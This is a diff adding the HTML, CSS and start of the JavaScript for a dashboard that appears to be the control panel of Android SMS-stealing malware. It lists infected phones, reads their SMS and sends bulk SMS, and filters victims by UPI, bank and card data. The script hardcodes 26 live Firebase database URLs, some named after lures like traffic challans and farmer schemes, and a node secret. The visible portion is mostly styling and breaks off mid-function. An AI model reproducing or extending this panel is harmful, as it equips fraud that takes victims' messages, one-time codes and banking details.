+            border-radius: 50%;
+            background: var(--gray);
+        }
+
+        .dhead .dstat.on .dot {
+            background: var(--dragon-eye);
+            box-shadow: 0 0 12px var(--dragon-eye);
+            animation: dotPulse 1.6s infinite;
+        }
+
+        .dhead .dstat .stxt {
+            color: #ffffff;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            font-size: 11px;
+        }
+
+        .dhead .dstat .bat {
+            color: var(--dragon-gold);
+            margin-left: 6px;
+            font-weight: 800;
+        }
+
+        .dclose {
+            width: 40px;
+            height: 40px;
+            border-radius: 12px;
+            background: linear-gradient(135deg, #a855f7, #7e22ce);
+            border: 2.5px solid var(--dragon-gold);
+            color: #ffffff;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            font-weight: 900;
+            box-shadow: 0 0 15px rgba(168, 85, 247, 0.6);
+            transition: all 0.12s;
+            flex-shrink: 0;
+        }
+
+        .dclose:hover {
+            transform: scale(1.08) rotate(90deg);
+        }
+
+        .dclose:active {
+            transform: scale(0.92);
+        }
+
+        .dtabs {
+            display: flex;
+            gap: 0;
+            background: #051329;
+            border-bottom: 2.5px solid rgba(168, 85, 247, 0.4);
+            padding: 0 8px;
+            overflow-x: auto;
+            flex-shrink: 0;
+        }
+
+        .dtabs::-webkit-scrollbar {
+            display: none;
+        }
+
+        .dtabs button {
+            padding: 14px 16px;
+            background: transparent;
+            border: none;
+            border-bottom: 3.5px solid transparent;
+            color: var(--text-dim);
+            font-family: 'Orbitron', sans-serif;
+            font-size: 11.5px;
+            font-weight: 800;
+            letter-spacing: 1px;
+            cursor: pointer;
+            white-space: nowrap;
+            transition: all 0.15s;
+            text-transform: uppercase;
+        }
+
+        .dtabs button:hover {
+            color: #ffffff;
+        }
+
+        .dtabs button.active {
+            color: var(--primary);
+            border-bottom-color: var(--primary);
+            text-shadow: 0 0 12px rgba(168, 85, 247, 0.7);
+        }
+
+        .dcontent {
+            flex: 1;
+            overflow-y: auto;
+            padding: 18px;
+            overscroll-behavior: contain;
+            -webkit-overflow-scrolling: touch;
+            touch-action: pan-y;
+            background: #06040a;
+        }
+
+        .irow {
+            display: flex;
+            justify-content: space-between;
+            padding: 12px 16px;
+            background: rgba(18, 12, 33, 0.9);
+            border: 2px solid rgba(168, 85, 247, 0.3);
+            border-radius: 12px;
+            margin-bottom: 9px;
+            font-size: 14px;
+            gap: 12px;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.6);
+        }
+
+        .irow .l {
+            color: var(--text-dim);
+            font-weight: 800;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 11px;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            flex-shrink: 0;
+        }
+
+        .irow .r {
+            color: #ffffff;
+            font-family: 'Rajdhani', sans-serif;
+            font-weight: 700;
+            word-break: break-all;
+            text-align: right;
+        }
+
+        .slabel {
+            font-family: 'Cinzel', serif;
+            font-size: 15px;
+            font-weight: 900;
+            color: var(--primary-light);
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            margin: 18px 0 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            text-shadow: 0 0 10px rgba(168, 85, 247, 0.5);
+        }
+
+        .slabel::before {
+            content: "";
+            width: 6px;
+            height: 18px;
+            background: var(--primary);
+            border-radius: 3px;
+            box-shadow: 0 0 10px var(--primary);
+        }
+
+        .slabel::after {
+            content: "";
+            flex: 1;
+            height: 2px;
+            background: linear-gradient(90deg, rgba(168, 85, 247, 0.5), transparent);
+        }
+
+        .slabel:first-child {
+            margin-top: 0;
+        }
+
+        .bitem {
+            background: rgba(18, 12, 33, 0.95);
+            border: 2.5px solid rgba(168, 85, 247, 0.35);
+            border-radius: 14px;
+            padding: 14px;
+            margin-bottom: 10px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.7);
+        }
+
+        .bitem .r1 {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .bitem .bn {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 14px;
+            font-weight: 800;
+            color: #ffffff;
+        }
+
+        .bitem .ba {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 16px;
+            font-weight: 900;
+            color: var(--dragon-gold);
+            text-shadow: 0 0 10px rgba(255, 209, 102, 0.6);
+        }
+
+        .bitem .sub {
+            font-size: 12px;
+            color: var(--text-dim);
+            margin-top: 8px;
+            padding-top: 8px;
+            border-top: 2px dashed rgba(168, 85, 247, 0.25);
+            font-family: 'Courier New', monospace;
+            word-break: break-word;
+            line-height: 1.5;
+        }
+
+        .smsitem {
+            background: rgba(16, 11, 29, 0.95);
+            border: 2.5px solid rgba(168, 85, 247, 0.35);
+            border-radius: 14px;
+            padding: 14px;
+            margin-bottom: 12px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.7);
+            font-size: 13.5px;
+            position: relative;
+        }
+
+        .smsitem::before {
+            content: "💬";
+            position: absolute;
+            top: -10px;
+            left: 14px;
+            background: linear-gradient(135deg, #a855f7, #7e22ce);
+            border: 2px solid var(--dragon-gold);
+            border-radius: 50%;
+            width: 22px;
+            height: 22px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 11px;
+            box-shadow: 0 0 10px rgba(168, 85, 247, 0.6);
+        }
+
+        .smsitem .sh {
+            display: flex;
+            justify-content: space-between;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 11px;
+            font-weight: 800;
+            color: var(--dragon-gold);
+            margin-bottom: 8px;
+            padding-left: 24px;
+        }
+
+        .smsitem .sh .time {
+            color: var(--text-dim);
+            font-family: 'Rajdhani', sans-serif;
+            font-weight: 700;
+            font-size: 12px;
+        }
+
+        .smsitem .sb {
+            color: #ffffff;
+            line-height: 1.55;
+            word-break: break-word;
+            font-weight: 600;
+        }
+
+        /* SMS FORM */
+        .sform {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .sform .fl {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 12px;
+            font-weight: 800;
+            color: var(--primary-light);
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+        }
+
+        .sims {
+            display: flex;
+            gap: 10px;
+        }
+
+        .sims button {
+            flex: 1;
+            padding: 12px;
+            background: rgba(18, 12, 33, 0.95);
+            border: 2.5px solid rgba(168, 85, 247, 0.35);
+            color: var(--text);
+            font-family: 'Orbitron', sans-serif;
+            font-size: 12px;
+            font-weight: 800;
+            border-radius: 12px;
+            cursor: pointer;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.6);
+            transition: all 0.12s;
+            letter-spacing: 1px;
+        }
+
+        .sims button.active {
+            background: linear-gradient(135deg, #a855f7, #7e22ce);
+            color: #ffffff;
+            border-color: var(--dragon-gold);
+            box-shadow: 0 0 15px rgba(168, 85, 247, 0.7);
+        }
+
+        .sform input,
+        .sform textarea {
+            background: rgba(6, 18, 40, 0.95);
+            border: 2.5px solid rgba(168, 85, 247, 0.35);
+            color: #ffffff;
+            padding: 13px 16px;
+            border-radius: 14px;
+            outline: none;
+            font-size: 14.5px;
+            font-family: 'Rajdhani', sans-serif;
+            font-weight: 700;
+            width: 100%;
+            box-shadow: 0 3px 12px rgba(0, 0, 0, 0.6);
+            transition: all 0.15s;
+        }
+
+        .sform input::placeholder,
+        .sform textarea::placeholder {
+            color: var(--gray);
+        }
+
+        .sform input:focus,
+        .sform textarea:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 20px rgba(168, 85, 247, 0.6);
+        }
+
+        .sform textarea {
+            resize: vertical;
+            min-height: 90px;
+        }
+
+        .sbtn {
+            padding: 15px;
+            background: linear-gradient(135deg, #a855f7 0%, #7e22ce 100%);
+            color: #ffffff;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 14px;
+            font-weight: 900;
+            letter-spacing: 2px;
+            border: 2.5px solid var(--dragon-gold);
+            border-radius: 14px;
+            cursor: pointer;
+            box-shadow: 0 0 25px rgba(168, 85, 247, 0.6);
+            transition: all 0.12s;
+            text-shadow: 0 1px 3px rgba(0, 0, 0, 0.6);
+            text-transform: uppercase;
+        }
+
+        .sbtn:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 0 35px rgba(168, 85, 247, 0.85);
+        }
+
+        .sbtn:active:not(:disabled) {
+            transform: scale(0.97);
+        }
+
+        .sbtn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        /* ============ MODAL ============ */
+        .overlay {
+            position: fixed;
+            inset: 0;
+            z-index: 2000;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            animation: fadeIn 0.2s cubic-bezier(0.16, 1, 0.3, 1);
+            overscroll-behavior: contain;
+            touch-action: none;
+        }
+
+        .modal {
+            background: #040e22;
+            border: 3.5px solid var(--primary);
+            border-radius: 24px;
+            width: 100%;
+            max-width: 530px;
+            max-height: 85vh;
+            overflow-y: auto;
+            padding: 22px;
+            box-shadow: 0 0 45px rgba(168, 85, 247, 0.45);
+            animation: popIn 0.25s cubic-bezier(0.16, 1, 0.3, 1);
+            color: var(--text);
+        }
+
+        @keyframes popIn {
+            from {
+                transform: scale(0.92);
+                opacity: 0;
+            }
+
+            to {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        .mhead {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 18px;
+            padding-bottom: 12px;
+            border-bottom: 2.5px solid rgba(168, 85, 247, 0.3);
+        }
+
+        .mtitle {
+            font-family: 'Cinzel', serif;
+            font-size: 19px;
+            font-weight: 900;
+            color: var(--primary-light);
+            letter-spacing: 1px;
+            text-shadow: 0 0 12px rgba(168, 85, 247, 0.7);
+            text-transform: uppercase;
+        }
+
+        .mclose {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #a855f7, #7e22ce);
+            border: 2px solid var(--dragon-gold);
+            color: #ffffff;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 17px;
+            font-weight: 900;
+            box-shadow: 0 0 12px rgba(168, 85, 247, 0.6);
+            transition: all 0.12s;
+        }
+
+        .mclose:hover {
+            transform: scale(1.08) rotate(90deg);
+        }
+
+        /* ============ CONFIRM ============ */
+        .cbox {
+            background: #040e22;
+            border: 3.5px solid var(--primary);
+            border-radius: 24px;
+            padding: 26px;
+            max-width: 390px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 0 45px rgba(168, 85, 247, 0.5);
+        }
+
+        .cbox .cicon {
+            font-size: 48px;
+            margin-bottom: 12px;
+            filter: drop-shadow(0 0 15px rgba(168, 85, 247, 0.8));
+        }
+
+        .cbox h3 {
+            font-family: 'Cinzel', serif;
+            font-size: 20px;
+            font-weight: 900;
+            color: var(--primary-light);
+            margin-bottom: 10px;
+            letter-spacing: 1px;
+            text-shadow: 0 0 12px rgba(168, 85, 247, 0.7);
+            text-transform: uppercase;
+        }
+
+        .cbox p {
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 14.5px;
+            font-weight: 700;
+            color: var(--text);
+            margin-bottom: 18px;
+            line-height: 1.5;
+        }
+
+        .cbox .cname {
+            color: var(--dragon-gold);
+            font-weight: 800;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+        }
+
+        .cbtns {
+            display: flex;
+            gap: 12px;
+        }
+
+        .cbtns button {
+            flex: 1;
+            padding: 13px;
+            border-radius: 14px;
+            border: 2.5px solid var(--outline);
+            font-family: 'Orbitron', sans-serif;
+            font-size: 12px;
+            font-weight: 800;
+            cursor: pointer;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            box-shadow: 0 3px 12px rgba(0, 0, 0, 0.7);
+            transition: all 0.12s;
+        }
+
+        .cbtns .cn {
+            background: rgba(18, 12, 33, 0.9);
+            border-color: rgba(168, 85, 247, 0.35);
+            color: var(--text);
+        }
+
+        .cbtns .cn:hover {
+            border-color: #ffffff;
+            color: #ffffff;
+        }
+
+        .cbtns .cy {
+            background: linear-gradient(135deg, #a855f7 0%, #7e22ce 100%);
+            border-color: var(--dragon-gold);
+            color: #fff;
+            box-shadow: 0 0 18px rgba(168, 85, 247, 0.7);
+        }
+
+        .cbtns .cy.restore {
+            background: linear-gradient(135deg, #10b981 0%, #047857 100%);
+            border-color: #6ee7b7;
+            color: #000;
+            box-shadow: 0 0 18px rgba(16, 185, 129, 0.7);
+        }
+
+        /* ============ TOAST ============ */
+        .toast {
+            position: fixed;
+            bottom: 90px;
+            left: 50%;
+            transform: translateX(-50%) translateY(120px);
+            background: #100a1f;
+            border: 2.5px solid var(--primary);
+            color: #ffffff;
+            padding: 13px 26px;
+            border-radius: 18px;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 13px;
+            font-weight: 800;
+            letter-spacing: 0.8px;
+            z-index: 4000;
+            transition: transform 0.35s cubic-bezier(0.34, 1.56, 0.64, 1);
+            max-width: 90%;
+            text-align: center;
+            pointer-events: none;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            box-shadow: 0 0 30px rgba(168, 85, 247, 0.6);
+        }
+
+        .toast.show {
+            transform: translateX(-50%) translateY(0);
+        }
+
+        .toast.ok {
+            background: #022c22;
+            border-color: var(--dragon-eye);
+            color: var(--dragon-eye);
+            box-shadow: 0 0 25px rgba(0, 245, 212, 0.6);
+        }
+
+        .toast.err {
+            background: #3f0814;
+            border-color: #f43f5e;
+            color: #ffffff;
+            box-shadow: 0 0 25px rgba(244, 63, 94, 0.7);
+        }
+
+        .toast.warn {
+            background: #2e1e03;
+            border-color: var(--dragon-gold);
+            color: var(--dragon-gold);
+            box-shadow: 0 0 25px rgba(255, 209, 102, 0.6);
+        }
+
+        /* ============ RESPONSIVE ============ */
+        @media (min-width: 720px) {
+            .device-list {
+                display: grid;
+                grid-template-columns: repeat(2, 1fr);
+                gap: 14px;
+            }
+
+            .controls,
+            .filterbar,
+            .grid-wrap,
+            .statbar {
+                max-width: 900px;
+                margin: 0 auto;
+            }
+
+            .statbar {
+                grid-template-columns: repeat(4, 1fr);
+                padding: 14px 20px;
+            }
+
+            .controls {
+                padding: 4px 20px 12px;
+            }
+
+            .filterbar {
+                padding: 4px 20px 12px;
+            }
+
+            .grid-wrap {
+                padding: 0 20px;
+            }
+
+            .search-wrap {
+                max-width: 500px;
+            }
+        }
+
+        @media (min-width: 1080px) {
+            .device-list {
+                grid-template-columns: repeat(3, 1fr);
+            }
+
+            .controls,
+            .filterbar,
+            .grid-wrap,
+            .statbar {
+                max-width: 1200px;
+            }
+        }
+
+        @media (max-width: 640px) {
+            .dpanel {
+                max-width: 100%;
+            }
+
+            .topbar .brand-name {
+                font-size: 18px;
+            }
+
+            .topbar .brand-tag {
+                font-size: 8.5px;
+                letter-spacing: 1.5px;
+            }
+
+            /* Stats Bar Mobile */
+            .statbar {
+                padding: 10px 8px;
+                gap: 6px;
+                width: 100%;
+                box-sizing: border-box;
+            }
+
+            .statcell {
+                padding: 10px 4px;
+                border-radius: 14px;
+                border-width: 2px;
+            }
+
+            .statcell .k {
+                font-size: 8.5px;
+                letter-spacing: 0.5px;
+            }
+
+            .statcell .v {
+                font-size: 20px;
+            }
+
+            .statcell .ico {
+                font-size: 11px;
+                top: 3px;
+                right: 4px;
+            }
+
+            /* Controls & Buttons Mobile */
+            .controls {
+                padding: 4px 8px 8px;
+                gap: 8px;
+                width: 100%;
+                box-sizing: border-box;
+            }
+
+            .btn-row {
+                gap: 6px;
+                width: 100%;
+                flex-wrap: wrap;
+            }
+
+            .dora-btn {
+                padding: 10px 4px;
+                font-size: 10.5px;
+                letter-spacing: 0.5px;
+                gap: 4px;
+                border-radius: 12px;
+                border-width: 2px;
+            }
+
+            .dora-btn .ico {
+                font-size: 13px;
+            }
+        }
+
+        /* High refresh rate scroll smoothing */
+        ::-webkit-scrollbar {
+            width: 7px;
+            height: 7px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #06040a;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: linear-gradient(180deg, #a855f7, #7e22ce);
+            border-radius: 4px;
+            box-shadow: 0 0 10px rgba(168, 85, 247, 0.6);
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: #c084fc;
+        }
+
+        /* Reduce motion for performance mode */
+        @media (prefers-reduced-motion: reduce) {
+            * {
+                animation-duration: 0.01ms !important;
+                transition-duration: 0.01ms !important;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- ============ APP ============ -->
+    <div id="app">
+        <div class="topbar">
+            <div class="brand">
+                <div class="brand-icon">
+                    <svg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
+                        <defs>
+                            <linearGradient id="blueDragonHorn" x1="0%" y1="0%" x2="100%" y2="100%">
+                                <stop offset="0%" stop-color="#c084fc" />
+                                <stop offset="50%" stop-color="#7e22ce" />
+                                <stop offset="100%" stop-color="#05030a" />
+                            </linearGradient>
+                            <linearGradient id="blueDragonPlate" x1="0%" y1="0%" x2="100%" y2="100%">
+                                <stop offset="0%" stop-color="#a855f7" />
+                                <stop offset="45%" stop-color="#581c87" />
+                                <stop offset="100%" stop-color="#06040a" />
+                            </linearGradient>
+                            <linearGradient id="blueEyeGlow" x1="0%" y1="0%" x2="100%" y2="100%">
+                                <stop offset="0%" stop-color="#ffffff" />
+                                <stop offset="40%" stop-color="#f5d0fe" />
+                                <stop offset="100%" stop-color="#a855f7" />
+                            </linearGradient>
+                            <filter id="blueDragonGlow" x="-20%" y="-20%" width="140%" height="140%">
+                                <feGaussianBlur stdDeviation="3.5" result="blur" />
+                                <feMerge>
+                                    <feMergeNode in="blur" />
+                                    <feMergeNode in="SourceGraphic" />
+                                </feMerge>
+                            </filter>
+                        </defs>
+                        <!-- Outer Shield Badge -->
+                        <polygon points="100,8 188,48 188,142 100,192 12,142 12,48" fill="#090514" stroke="#a855f7"
+                            stroke-width="5.5" />
+                        <polygon points="100,18 178,54 178,136 100,180 22,136 22,54" fill="#06030c" stroke="#9333ea"
+                            stroke-width="2" opacity="0.85" />
+                        <!-- Outer Monster Horns -->
+                        <path d="M62,68 Q24,24 34,4 Q56,18 76,54 Z" fill="url(#blueDragonHorn)" stroke="#040208"
+                            stroke-width="2" />
+                        <path d="M138,68 Q176,24 166,4 Q144,18 124,54 Z" fill="url(#blueDragonHorn)" stroke="#040208"
+                            stroke-width="2" />
+                        <!-- Inner Crown Spikes -->
+                        <path d="M78,48 Q70,18 80,8 Q92,24 90,46 Z" fill="url(#blueDragonHorn)" />
+                        <path d="M122,48 Q130,18 120,8 Q108,24 110,46 Z" fill="url(#blueDragonHorn)" />
+                        <!-- Center Lightning Spike -->
+                        <polygon points="100,12 108,44 100,52 92,44" fill="#c084fc" filter="url(#blueDragonGlow)" />
+                        <!-- Dragon Skull Head -->
+                        <polygon points="100,38 136,62 146,102 128,146 100,165 72,146 54,102 64,62"
+                            fill="url(#blueDragonPlate)" stroke="#a855f7" stroke-width="3" />
+                        <!-- Brow Ridges -->
+                        <path d="M65,82 L95,92 L98,86 L68,76 Z" fill="#9333ea" />
+                        <path d="M135,82 L105,92 L102,86 L132,76 Z" fill="#9333ea" />
+                        <!-- Glowing Slit Eyes -->
+                        <polygon points="70,88 92,94 88,98 68,92" fill="url(#blueEyeGlow)"
+                            filter="url(#blueDragonGlow)" />
+                        <polygon points="130,88 108,94 112,98 132,92" fill="url(#blueEyeGlow)"
+                            filter="url(#blueDragonGlow)" />
+                        <polygon points="80,88 83,91 80,95 78,92" fill="#000" />
+                        <polygon points="120,88 122,91 120,95 118,92" fill="#000" />
+                        <!-- Snout & Nostrils breathing blue lightning flame -->
+                        <polygon points="100,100 116,128 100,144 84,128" fill="#07040d" stroke="#a855f7"
+                            stroke-width="2" />
+                        <circle cx="93" cy="132" r="3" fill="#c084fc" filter="url(#blueDragonGlow)" />
+                        <circle cx="107" cy="132" r="3" fill="#c084fc" filter="url(#blueDragonGlow)" />
+                        <!-- Sharp Dragon Fangs -->
+                        <polygon points="88,140 92,154 96,140" fill="#fff" />
+                        <polygon points="104,140 108,154 112,140" fill="#fff" />
+                        <polygon points="82,142 86,150 90,142" fill="#d8b4fe" />
+                        <polygon points="110,142 114,150 118,142" fill="#d8b4fe" />
+                        <polygon points="96,148 100,164 104,148" fill="#fff" filter="url(#blueDragonGlow)" />
+                    </svg>
+                </div>
+                <div class="brand-text">
+                    <div class="brand-name">RAHUL-V3</div>
+                    <div class="brand-tag">⚡ JACK KA DASHBOARD · V3 🌌</div>
+                </div>
+            </div>
+            <button class="lock-btn" id="lockBtn" title="Refresh">🔄</button>
+        </div>
+
+        <!-- STATS -->
+        <div class="statbar">
+            <div class="statcell total">
+                <div class="ico">📱</div>
+                <div class="k">Total</div>
+                <div class="v" id="sTotal">0</div>
+            </div>
+            <div class="statcell live-ping" id="statPingCell" style="cursor: pointer;"
+                title="Click to view Live Responding Devices">
+                <div class="ico">📡</div>
+                <div class="k">Live Ping</div>
+                <div class="v" id="sPing">0</div>
+            </div>
+            <div class="statcell online">
+                <div class="ico">🟢</div>
+                <div class="k">Online</div>
+                <div class="v" id="sOnline">0</div>
+            </div>
+            <div class="statcell offline">
+                <div class="ico">🔴</div>
+                <div class="k">Offline</div>
+                <div class="v" id="sOffline">0</div>
+            </div>
+        </div>
+
+        <div class="controls">
+            <div class="btn-row">
+                <button class="dora-btn blue" id="allSmsBtn"><span class="ico">💬</span> ALL SMS</button>
+                <button class="dora-btn green" id="pingBtn"><span class="ico">📡</span> LIVE PING</button>
+                <button class="dora-btn yellow" id="starBtn"><span class="ico">⭐</span> STARRED</button>
+            </div>
+            <div class="btn-row">
+                <button class="dora-btn red" id="bulkBtn"><span class="ico">📤</span> BULK SEND</button>
+                <button class="dora-btn yellow" id="cardsBtn" disabled><span class="ico">💳</span> CARDS</button>
+            </div>
+            <div class="search-wrap">
+                <input type="text" id="searchInput" placeholder="Search devices..." />
+            </div>
+        </div>
+
+        <div class="filterbar" id="filterbar">
+            <button class="active" data-f="all">ALL</button>
+            <button data-f="ping"
+                style="background: linear-gradient(135deg, rgba(16, 185, 129, 0.22) 0%, rgba(5, 150, 105, 0.32) 100%); border-color: #10b981; color: #34d399; font-weight: 900;"><span
+                    class="ico">📡</span> PING (<span id="sPingCount">0</span>)</button>
+            <button data-f="active">ACTIVE</button>
+            <button data-f="muted">MUTED</button>
+            <button data-f="online">ONLINE</button>
+            <button data-f="offline">OFFLINE</button>
+            <button data-f="upi">UPI</button>
+            <button data-f="bank">BANK</button>
+            <button data-f="card">CARD</button>
+            <div style="flex-shrink:0;">
+                <select class="sel" id="sortSel">
+                    <option value="number" selected>NUMBER (#1, #2…)</option>
+                    <option value="newest">NEWEST</option>
+                    <option value="oldest">OLDEST</option>
+                    <option value="name">NAME</option>
+                    <option value="battery">BATTERY</option>
+                </select>
+            </div>
+        </div>
+
+        <div class="grid-wrap">
+            <div class="device-list" id="deviceList"></div>
+        </div>
+
+        <button class="fab" id="fabBtn" title="Refresh">🤖</button>
+    </div>
+
+    <div id="detailRoot"></div>
+    <div id="modalRoot"></div>
+    <div id="confirmRoot"></div>
+    <div class="toast" id="toast"></div>
+
+    <script>
+        (function () {
+            'use strict';
+
+            var HARDCODED_SOURCES = [
+                { id: '#SRV1', url: 'https://dhehe-bd9dd-default-rtdb.firebaseio.com', secret: '', tag: 'Server 1' },
+                { id: '#SRV2', url: 'https://shambhu-5bd51-default-rtdb.firebaseio.com', secret: '', tag: 'Server 2' },
+                { id: '#SRV3', url: 'https://mishra-d9db2-default-rtdb.firebaseio.com', secret: '', tag: 'Server 3' },
+                { id: '#SRV4', url: 'https://panda20-4ee82-default-rtdb.firebaseio.com', secret: '', tag: 'Server 4' },
+                { id: '#SRV5', url: 'https://mosaji-default-rtdb.firebaseio.com', secret: '', tag: 'Server 5' },
+                { id: '#SRV6', url: 'https://monuk-53093-default-rtdb.firebaseio.com', secret: '', tag: 'Server 6' },
+                { id: '#SRV7', url: 'https://rani-15778-default-rtdb.firebaseio.com', secret: '', tag: 'Server 7' },
+                { id: '#SRV8', url: 'https://obcustion-default-rtdb.firebaseio.com', secret: '', tag: 'Server 8' },
+                { id: '#SRV9', url: 'https://prince-28541-default-rtdb.firebaseio.com', secret: '', tag: 'Server 9' },
+                { id: '#SRV10', url: 'https://ankit-85747-default-rtdb.firebaseio.com', secret: '', tag: 'Server 10' },
+                { id: '#SRV11', url: 'https://abhishek-33c1f-default-rtdb.firebaseio.com', secret: '', tag: 'Server 11' },
+                { id: '#SRV12', url: 'https://ladh-cb-default-rtdb.firebaseio.com', secret: '', tag: 'Server 12' },
+                { id: '#SRV13', url: 'https://ibhaiya-default-rtdb.firebaseio.com', secret: '', tag: 'Server 13' },
+                { id: '#SRV14', url: 'https://apnnkshok-default-rtdb.firebaseio.com', secret: '', tag: 'Server 14' },
+                { id: '#SRV15', url: 'https://admin-panel-client-d2362-default-rtdb.firebaseio.com', secret: '', tag: 'Server 15' },
+                { id: '#SRV16', url: 'https://suman-3f12e-default-rtdb.firebaseio.com', secret: '', tag: 'Server 16' },
+                { id: '#SRV17', url: 'https://ankit-f3496-default-rtdb.firebaseio.com', secret: '', tag: 'Server 17' },
+                { id: '#SRV18', url: 'https://lakhan-8d876-default-rtdb.firebaseio.com', secret: '', tag: 'Server 18' },
+                { id: '#SRV19', url: 'https://rto-challan-2cd79-default-rtdb.firebaseio.com', secret: '', tag: 'Server 19' },
+                { id: '#SRV20', url: 'https://admin226-default-rtdb.firebaseio.com', secret: '', tag: 'Server 20' },
+                { id: '#SRV21', url: 'https://admin-49394-default-rtdb.firebaseio.com', secret: '', tag: 'Server 21' },
+                { id: '#SRV22', url: 'https://mypani-8b503-default-rtdb.firebaseio.com', secret: '', tag: 'Server 22' },
+                { id: '#SRV23', url: 'https://ujjimpkisan-default-rtdb.firebaseio.com', secret: '', tag: 'Server 23' },
+                { id: '#SRV24', url: 'https://ajayi-992d2-default-rtdb.firebaseio.com', secret: '', tag: 'Server 24' },
+                { id: '#SRV25', url: 'https://ajay-18c7a-default-rtdb.firebaseio.com', secret: '', tag: 'Server 25' },
+                { id: '#SRV26', url: 'https://error-56419-default-rtdb.firebaseio.com', secret: '', tag: 'Server 26' }
+            ];
+
+            var FIXED_FB_URL = HARDCODED_SOURCES[0].url;
+            var PASSWORD = null;
+            var NODE_SECRET = 'rolex';
+            var FIREBASE_URL = '';
+            var FIREBASE_KEY = '';
+
+            var sources = [];
+            var devices = [];
+            var filtered = [];
+            var stars = {};
+            var blacklist = [];
+            var mutedDevices = {};
+            var smsDevices = {};
+            var cardTokens = {};
+            var searchQ = '';
+            var currentFilter = 'all';
+            var currentSort = 'number';
+            var selectedDevice = null;
+            var detailTab = 'info';
+            var smsMsgs = [];
+            var smsData = { bankBalances: [], cards: [], phoneNumbers: [], networks: [] };
+            var simSel = 1;
+            var bulkSimSel = 1;
+            var detailSmsInt = null;
+            var fetchInt = null;
+            var fetchBusy = false;
+            var allSmsMessages = [];
+            var allSmsPage = 0;
+            var allSmsPageSize = 50;
+            var showMutedSms = false;
+
+            // User interaction scroll tracker for silky smooth silent background refresh
+            var userIsScrolling = false;
+            var scrollEndTimer = null;
+            window.addEventListener('scroll', function () {
+                userIsScrolling = true;
+                clearTimeout(scrollEndTimer);
+                scrollEndTimer = setTimeout(function () { userIsScrolling = false; }, 800);
+            }, { passive: true });
+
+            var $deviceList = document.getElementById('deviceList');
+            var $detailRoot = document.getElementById('detailRoot');
+            var $modalRoot = document.getElementById('modalRoot');
+            var $confirmRoot = document.getElementById('confirmRoot');
+            var $toast = document.getElementById('toast');
+
+            var STAR_KEY = 'doraemon_stars_v1';
+            var BL_KEY = 'doraemon_blacklist_v1';
+
+            function loadStars() { try { var r = localStorage.getItem(STAR_KEY); return r ? JSON.parse(r) : {}; } catch (e) { return {}; } }
+            function saveStars() { try { localStorage.setItem(STAR_KEY, JSON.stringify(stars)); } catch (e) { } }
+            function loadBL() { try { var r = localStorage.getItem(BL_KEY); return r ? JSON.parse(r) : []; } catch (e) { return []; } }
+            function saveBL() { try { localStorage.setItem(BL_KEY, JSON.stringify(blacklist)); } catch (e) { } }
+
+            function dkey(d) { return String(d.id) + '::' + (d._srcUrl || ''); }
+            function isStar(d) { return !!stars[dkey(d)]; }
+            function toggleStar(d) { var k = dkey(d); if (stars[k]) delete stars[k]; else stars[k] = 1; saveStars(); }
+            function isBL(d) { return blacklist.indexOf(dkey(d)) !== -1; }
+            function addBL(d) { var k = dkey(d); if (blacklist.indexOf(k) === -1) { blacklist.push(k); saveBL(); } }
+            function rmBL(d) { var k = dkey(d); var i = blacklist.indexOf(k); if (i !== -1) { blacklist.splice(i, 1); saveBL(); } }
+
+            function toast(msg, type) {
+                type = type || '';
+                $toast.textContent = msg;
+                $toast.className = 'toast ' + type;
+                requestAnimationFrame(function () { $toast.classList.add('show'); });
+                clearTimeout($toast._t);
+                $toast._t = setTimeout(function () { $toast.classList.remove('show'); }, 2200);
+            }
+            function esc(s) {
+                if (!s && s !== 0) return '';
+                return String(s).replace(/[&<>"']/g, function (c) {
+                    return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
+                });
+            }
+            function authQuery(sec, extra) {
+                var q = [];
+                if (sec) q.push('auth=' + encodeURIComponent(sec));
+                if (extra) extra.forEach(function (e) { q.push(e); });
+                return q.length ? ('?' + q.join('&')) : '';
+            }
+            function normalizeEpoch(n) {
+                if (n > 1000000000000) return Math.floor(n / 1000);
+                return n;
+            }
+            function parseSmsTime(dateStr, fallback) {
